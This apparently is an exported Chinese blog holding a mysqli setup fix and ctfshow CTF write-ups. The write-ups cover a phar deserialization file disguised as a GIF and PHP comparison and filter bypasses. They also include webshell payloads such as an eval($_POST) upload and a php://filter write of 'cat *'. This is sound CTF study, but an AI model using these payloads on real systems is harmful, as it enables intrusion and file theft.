array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;;             return false;         &#125;     &#125; &#125; 

由上可知上传的文件后缀名只允许&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;，并且文件会上传到upload目录下面去
综上，构造的代码如下：
&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a = new Test();$a-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;; //因为source属性是get函数的传参，我们可以利用它自定义读取的文件$b = new Show();$b-&gt;str[&#x27;str&#x27;] = $a; //Show类中的str[&#x27;str&#x27;]给Test类，因为该属性对于Test类不存在，可以调用__get魔术方法$c = new C1e4r();$c-&gt;str = $b;   //C1e4r类将str属性给Show类/*最后打包成phar文件*/$phar = new Phar(&quot;a.gif&quot;); //后缀名改为gif$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;); //绕过图片检查$phar-&gt;setMetaData($c);$phar-&gt;addFromString(&quot;test2.txt&quot;, &quot;test2&quot;);$phar-&gt;stopBuffering();

运行代码后得到我们所要的文件，上传并访问upload目录，如下：
然后访问刚刚上传的文件：/file.php?file=phar://upload/	5d719d2e174b5a883867b802a89db296.jpg

得到一串base64编码的字符串，拿去解码后就可以得到flag啦
题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>PHP中出现Call to undefined function mysqli_connect()</title>
    <url>/2024/05/25/PHP%E4%B8%AD%E5%87%BA%E7%8E%B0Call-to-undefined-function-mysqli-connect/</url>
    <content><![CDATA[错误 Call to undefined function mysqli_connect() 和错误 can’t find class mysqli in :***** 错误是同一种错误，只是php中连接 MySQl的不同写法而已
那么我们要怎么做呢
首先，让我们到自己安装的php目录下面，打开它的配置文件
如果像我一样用的是phpstudy下的八点多的版本，那么它的配置文件php.ini是空的，需要我们自己去把当前目录下的php.ini-development里面的所有内容复制过去（该文件可以用记事本打开）
然后在配置文件中搜索一下extension_dir，如下：
将图中选中的部分改为 ./ext/，并把前面的分号去掉（这是因为在修改成的目录下面有php_mysqli.dll，如果没有那就是下载的时候出错了，再重新下载一遍）
注意：配置文件中的分号其实是注释符，要开启啥功能要先把它去掉
然后让我们搜索 extension=，然后会发现一大块都是extension=的部分，在其中添加上extension=mysqli，如下：

注意：配置文件里面原本也存在extension&#x3D;mysqli，把它前面的分号去掉的话是不会起作用的
修改完后要记得保存，然后我们就重启phpstudy和phpstorm，然后就可以正常连接了
其实我们还可以验证一下，打开命令行，输入：php -m，显示的一部分如下：

我们可以看到有mysqli，这说明我们的操作成功了（这种验证方法的前提是你有配置php的环境）
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php特性</title>
    <url>/2024/02/27/php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[知识1、数组绕过正则表达式if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;else(intval($num))&#123;        echo $flag;    &#125;

preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句
payload:num[]=1
2、intval函数的使用intval( mixed $value, int $base = 10) : int

如果 base 是 0，通过检测 value 的格式来决定使用的进制：◦ 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，◦ 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，◦ 将使用 10 进制 (decimal)
if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;

科学计数法也可以绕过
intval(&#x27;4476.0&#x27;)===4476    小数点  intval(&#x27;+4476.0&#x27;)===4476   正负号intval(&#x27;4476e0&#x27;)===4476    科学计数法intval(&#x27;0x117c&#x27;)===4476    16进制intval(&#x27;010574&#x27;)===4476    8进制intval(&#x27; 010574&#x27;)===4476   8进制+空格

payload:num=4476.0
3、正则表达式修饰符&amp;web91if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;nonononono&#x27;;&#125;

^匹配字符串的开头，i 不区分(ignore)大小写；$匹配字符串的末尾，m多(more)行匹配，若有换行符则以换行符分割，按行匹配
payload:%0aphp,第一行匹配换行后有php故通过，第二个不符合php开头php结尾故不通过
4、highlight_file路径&amp;web96highlight_file的参数可以是路径的
if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;

if语句只比对字符串，highlight_file可以写路径，故payload有多种解法：
/var/www/html/flag.php              绝对路径./flag.php                          相对路径php://filter/resource=flag.php      php伪协议

5、md5比较缺陷PHP中hash比较是存在缺陷的，MD5无法处理数组，如果传入数组则返回NULL，两个NULL是强相等的
if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])&#123;    if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))&#123;        echo $flag;    &#125;else&#123;    print &#x27;Wrong.&#x27;;    &#125;&#125;

不同数据强相等
payload:a[]=1&amp;b[]=2
md5弱比较，使用了强制类型转换后不再接收数组
$a=(string)$a;$b=(string)$b;if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;echo $flag;&#125;

md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。
不同数据弱相等
payload: a=QNKCDZO&amp;b=240610708
MD5等于自身，如md5($a)==$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017
md5强碰撞
$a=(string)$a;$b=(string)$b;if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;echo $flag;&#125;这时候需要找到两个真正的md5值相同数据a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

6、三目运算符的理解+变量覆盖&amp;web98&lt;?php    include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt;

第一行，GET被设置，就可以用POST覆盖GET的值。中间两行意义不大，是flag就被COOKIE覆盖，然后被SERVER覆盖，不是flag被赋值flag然后条件成立也是被SERVER覆盖。而且这个被覆盖的GET没有指定，任意都行，第四行才是关键，等于flag就输出flag，不等于显示源码。所以只需要传入一个任意的GET保证$_GET是被设置的。然后POST一个覆盖它
第一行，使用GET方式接收数据，若是GET传参，则将GET替换成POST 先用GET 往里传东西，随便传 例如： url?1 然后根据最后一行 hackbar通过POST方式往里传HTTP_FLAG&#x3D;flag即可
payload:get：1=1 post：HTTP_FLAG=flag
7、php弱类型比较&amp;web99经典
$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;

对于代码的解释：

$allow = array();: 创建了一个名为 $allow 的空数组，用于存储允许操作的文件名。
for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i)); &#125;: 这是一个 for 循环，从十进制数 36 到十六进制数 0x36d（十进制数为 877）循环遍历，每次循环将一个随机数（范围在 1 到当前循环变量 $i 的值之间）添加到 $allow 数组中。这样做的目的是生成一个随机的允许操作的文件名数组。
if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;: 这行代码首先检查是否设置了 GET 请求参数 &#39;n&#39;，并且检查参数值是否存在于 $allow 数组中。如果这两个条件都满足，则继续执行下面的代码。
file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);: 这行代码使用 file_put_contents() 函数将 POST 请求参数 &#39;content&#39; 的内容写入到名为 &#39;n&#39; 的文件中。这里的 $_GET[&#39;n&#39;] 是文件名，$_POST[&#39;content&#39;] 是要写入的文件内容。

弱比较字符串1.php与1返回true。array_push这个函数往里填数字1，则是int类型，in_array使用的就是&#x3D;&#x3D;弱比较。所以，如果数组里有数字1，与字符串1.php比较时是返回true的。注意，$array( 1 , ‘2’ , ‘3’ )，这里1是int型，2和3都是string类型。
这道题，每次生成随机数都包含1，所以1在数组中的可能最大。
payload:n=1.php post:content=&lt;?php eval($_POST[1]);?&gt;只要，然后蚁剑直接连
8、and与&amp;&amp;的区别&lt;?php$a=true and false and false;var_dump($a);  返回true$a=true &amp;&amp; false &amp;&amp; false;var_dump($a);  返回false

and运算符优先级低于 =，&amp;&amp;运算符优先级高于 =
9、反射类ReflectionClass&amp;web101反射类还不太懂，但做题都是直接输出这个类echo new ReflectionClass(&#39;类名&#39;);，可以获得类的反射对象（包含元数据信息）。
元数据对象（包含class的所有属性&#x2F;方法的元数据信息）
&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125;?&gt;

payload：?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;
flag中有些字符经过ACSII码变换，好像还少了一位，爆破即可（这步目前还不会操作）
10、is_numeric与hex2bin is_numeric在PHP5中是可以识别十六进制的，hex2bin参数不能带0x
11、sha1比较缺陷&amp;web104sha1无法处理数组，如下可使用a[]&#x3D;1&amp;b[]&#x3D;1数组绕过
if($a==$b)&#123;    if(sha1($a)==sha1($b))&#123;        echo $flag;    &#125;&#125;

但MD5或者sha1这种如果强制类型转换后，就不接受数组了，这个时候就要找真正的编码后相同的了，如
aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m

12、PHP双$（$$）的变量覆盖在双写$的时候，属于动态变量，就是后面的变量值作为新的变量名
$test=&quot;a23&quot;;    $test等于a23$$test=456;        $$test也就等于$a23,这里相当于给$a23赋值了echo $test;        正常输出$test为a23echo $$test;    这里输出$$test，就是$a23，为456echo $a23;        第二行给$a23赋值了，这里正常输出

13、parse_str函数的使用parse_str会把字符串解析为变量，大部分是传入的多个值
$a=&quot;q=123&amp;p=456&quot;;parse_str($a);  //没有提供第二个参数（存储解析结果的数组），所以解析后的键值对将会以相应的变量形式存在echo $q;                输出123echo $p;                输出456parse_str($a,$b);        第二个参数作为数组，解析的变量都存入这个数组中echo $b[&#x27;q&#x27;];            输出123echo $b[&#x27;p&#x27;];            输出456

php8版本必须要有第二个参数，php7不影响使用但会警告一下
14、ereg %00正则截断&amp;web108ereg PHP5.3废弃了，功能可以由preg_match代替，ereg有个截断漏洞，字符串里包括%00就只匹配%00之前的内容。所以可以前面根据正则改，后面是执行语句，如果有strrev() 这种字符串反转函数配合用更好。
&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;    die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;?&gt;

payload：?c=w%00778
15、迭代器获取当前目录(getcwd())&amp;web109&amp;web110FilesystemIterator可以获得文件目录，参数需要 . 或者具体路径，**getcwd()**这个函数可以获取当前文件路径，二者在一定条件下配合使用较好
&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt;

payload：?v1=FilesystemIterator&amp;v2=getcwd
16、$GLOBALS全局变量的使用&amp;web111$GLOBALS — 引用全局作用域中可用的全部变量一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
构造出var_dump($GLOBALS);可以输出全部变量值，包括自定义
&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;?&gt;

$$v1 = &amp;$$v2;：在这句代码中，$v1和$v2的值是一个变量名，然后右侧变量的值会赋值给左侧变量
按照我们所掌握的，$v1可以是任意值，所以构造playload为：?v1=ctfshow&amp;v2=GLOBALS，最后得到了所有变量的值，然后可以看到flag其实就是变量flag的值
17、php伪协议绕过is_file；highlight_file对于php伪协议的使用&amp;web112&amp;web114is_file判断给定文件名是否为一个正常的文件，返回值为布尔类型。is_file会认为php伪协议不是文件。但highlight_file认为伪协议可以是文件。
if(! is_file($file))&#123;    highlight_file($file);&#125;else&#123;    echo &quot;hacker!&quot;;&#125;

如上的代码，可以传入php伪协议进行绕过并且显示含有flag的文件。若有过滤，可以换其他伪协议或改编码方式
&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;

本题题目过滤掉了一部分的过滤器，但是还有许多其他过滤器可以使用，当然本题我们也可以不适用过滤器
payload为：?file=php://filter/resource=flag.php
18、多写根目录绕过is_file&amp;web113在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls &#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容
这利用函数所能处理的长度限制进行目录溢出： 原理：&#x2F;proc&#x2F;self&#x2F;root代表根目录，进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了
如上面的代码，也可以用下面payload代替
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

这个按理说也是文件的，但is_file认为不是
19、trim函数的绕过+is_numeric绕过&amp;web115这两个函数一起检测时，is_numeric认为内容里有%09 %0a %0b %0c %0d %20也算数字，跟trim一起测试一下
for ($i=0; $i &lt;=128 ; $i++) &#123;     $x=chr($i).&#x27;1&#x27;;   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;        echo urlencode(chr($i)).&quot;\n&quot;;   &#125;&#125;

除了+-.号以外还有只剩下%0c也就是换页符了，trim默认时没有剔除%0c。形如以下代码可以绕过
if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27;)&#123;    if($num==&#x27;36&#x27;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;

payload:num=%0c36
20、绕过死亡die（利用过滤器UCS-2LE UCS-2BE）function filter($x)&#123;    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);

这道看了羽师傅wp，过滤了许多协议，这是取一个 UCS-2LE UCS-2BE
payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phppost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?

这会将字符两位两位交换，file_put_contents在写入的时候会破坏那句die，但contents那句恢复原貌，可以执行
21、通过内置bash命令构造命令在许多命令被过滤时，可以一个字母一个字母得构造，而这些字母从内置变量里面截，比如构造nl，可以写为下面这种方式
$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125;

在linux中可以用~获取变量的最后几位，也可以写为$&#123;PATH:~0&#125;$&#123;PWD:~0&#125;，字母与0作用一样，$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;也是nl，flag.php也过滤了的话可以用????.???，具体情况，具体对待
22、PHP变量名非法字符&amp;web123比如传入AA_BB.CC这个变量，PHP是不允许变量名中含有. 的，会默认将不合法字符替换为_,如下：
&lt;?php var_dump($_POST);?&gt;         传值：AA.BB.CC=14输出：array(1) &#123; [&quot;AA_BB_CC&quot;]=&gt; string(2) &quot;14&quot; &#125;

但输入AA[BB.CC它就只替换 [ 输出 array(1) { [“AA_BB.CC”]&#x3D;&gt; string(2) “14” }
&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;

这题post传进去的变量CTF_SHOW和变量CTF_SHOW.COM都不能为空，然后变量fl0g为空才能够满足条件
但是变量名CTF_SHOW.COM中有非法字符，按照上面的方法进行绕过，所以构造的payload为：CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag
23、gettext拓展的使用var_dump(call_user_func($f1,$f2));

如以上代码，多重过滤后，f1可以为gettext，f2可以为phpinfo，如果过滤更为严格，更改ini文件里的拓展后， _() 等效于 gettext()
&lt;?phpecho gettext(&quot;phpinfo&quot;);结果  phpinfoecho _(&quot;phpinfo&quot;);结果 phpinfo

24、正则最大回溯次数绕过PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。
也就是说前面100万个字母，后面是语句就好，如下面的例子
if(preg_match(&#x27;/.+?ABC/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f, &#x27;ABC&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;

前面100万个字母后面ABC就可以echo $flag
25、调用类中的函数-&gt;用于动态语境处理某个类的某个实例::可以调用一个静态的、不依赖于其他初始化的类方法
也就是说双冒号不用实例化类就可以调用类中的静态方法
class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]);

这个传入ctfshow&#x3D;ctfshow::getFlag即可
26、return绕过eval(&quot;return 1;phpinfo();&quot;);会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。
题目web89include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;

preg_match当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1；所以可以通过数组绕过
web90(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;

payload：?num=4476.0
web92(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;

由于 $num==4476是弱比较，对于类型不看重，只要最后的值是一样的就行，所以之前的科学计数法什么的都不能够成功绕过，所以需要把4476转为8进制等其他进制的数字来绕过
web93(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125; 

八进制绕过：?num=010574
web94(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;

strpos函数是PHP中用于查找字符串中第一次出现指定子字符串的位置的函数。
strpos($num, &quot;0&quot;)： $num是一个字符串，想要查找的子字符串是 “0”
题目里要求输入的内容里面必须包含0，并且不包含字母，不能强等于4476，在经过intval函数后还要等于4476，所以payload：num=4476.0
web95(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125; 

可以通过八进制绕过，但是前面必须多加一个字节：?num=+010574
web97(md5)include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;	if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])		if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))			echo $flag;		else			print &#x27;Wrong.&#x27;;&#125;?&gt;

数组绕过：a[]=1&amp;b[]=2
web100&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125;?&gt;

is_numeric()函数用于判断一个变量是否为数字或数字字符串。如果变量是数字或数字字符串，则返回 true，否则返回 false
在PHP中，逻辑运算符and会比=的优先级低，所以在这个表达式中，=会先执行，然后才是and，所以当其中一个为数字，另外两个不是数字时，$v0的值将取决于第一个条件的结果，因为逻辑运算符and会被视为最后一个操作符。因此，$v0将被赋值为第一个条件的结果，而不会考虑后续条件。
payload：?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=/**/;
web102&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    file_put_contents($v3,$str);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;

call_user_func() 调用方法或变量,第一个参数是调用的对象，第二个参数是被调用对象的参数
file_put_contents() 用来写文件进去，第一个参数是文件名，第二个参数是需要写进文件中的内容，文件名支持伪协议
payload： 参数分析： v1是调用方法v2是数字字符串，且是写进文件中的内容 v3是文件名（可通过伪协议来创建）
v3&#x3D;php://filter/write=convert.base64-decode/resource=2.php v2:写进2.php的内容 ——&gt; 查看当前页面源码；&lt;?&#x3D;cat *; ——&gt; 转为base64为PD89YGNhdCAqYDs ——&gt;转为16进制的ascii码为5044383959474e6864434171594473——&gt;绕过截断，在前面随意加两位数字225044383959474e6864434171594473 v1：将数字字符串还原为base64码 ——&gt; hex2bin
最终payload： v1=hex2bin v2=225044383959474e6864434171594473 v3=php://filter/write=convert.base64-decode/resource=2.php
web105&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123;    if($value===&#x27;flag&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);?&gt;

payload：?suces=flag；post：error=suces
$key=suces,$suces=$flag,$error=$suces=$flag

